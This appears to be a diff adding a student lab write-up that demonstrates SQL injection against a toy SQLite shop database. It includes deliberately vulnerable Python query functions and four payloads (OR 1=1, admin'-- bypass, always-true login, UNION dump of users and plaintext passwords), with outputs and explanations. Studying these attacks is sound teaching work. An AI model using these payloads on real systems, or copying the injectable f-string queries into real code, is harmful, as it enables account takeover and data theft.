@@ -139,3 +139,88 @@ Query G
 (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)
 
 screenshots/task2.png
+
+TASK 3
+
+import sqlite3
+
+conn = sqlite3.connect('nyondo_stock.db')
+
+def search_product(name):
+    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
+    print(f"\nQuery: {query}")
+    rows = conn.execute(query).fetchall()
+    print(f"Result: {rows}\n")
+    return rows
+
+def login(username, password):
+    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+    print(f"\nQuery: {query}")
+    row = conn.execute(query).fetchone()
+    print(f"Result: {row}\n")
+    return row
+
+print("=== Attack 1: Dump all products ===")
+search_product("' OR 1=1--")
+
+print("=== Attack 2: Login bypass ===")
+login("admin'--", "anything")
+
+print("=== Attack 3: Always true login ===")
+login("' OR '1'='1", "' OR '1'='1")
+
+print("=== Attack 4: UNION attack ===")
+search_product("' UNION SELECT id, username, password, role FROM users--")
+
+conn.close() 
+
+ATTACK 1
+Query: 
+SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
+
+
+Result:
+ [(1, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), 
+ (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), 
+ (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
+
+Explanation: 
+OR 1=1 is always true, so WHERE condition is bypassed and all products are returned.
+
+ATTACK 2
+Query:
+SELECT * FROM users WHERE username='admin'--' AND password='anything'
+
+Result:
+(1, 'admin', 'admin123', 'admin')
+
+Explanation:
+-- comments out the password check, allowing login without a valid password.
+
+ATTACK 3
+Query:
+SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1
+
+Result:
+ (1, 'admin', 'admin123', 'admin')
+
+Explanation:
+'1'='1' is always true, so the login condition always succeeds.
+
+ATTACK 4
+Query:
+SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
+
+Result:
+[(1, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (1, 'admin', 'admin123', 'admin'), 
+(2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (2, 'fatuma', 'pass456', 'attendant'), 
+(3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (3, 'wasswa', 'pass789', 'manager'), 
+(4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
+
+Explanation:
+UNION operator merges results from another table, exposing sensitive user data including passwords.
+
+screenshots/task3_attack1.png 
+screenshots/task3_attack2.png
+screenshots/task3_attack3.png
+screenshots/task3_attack4.png
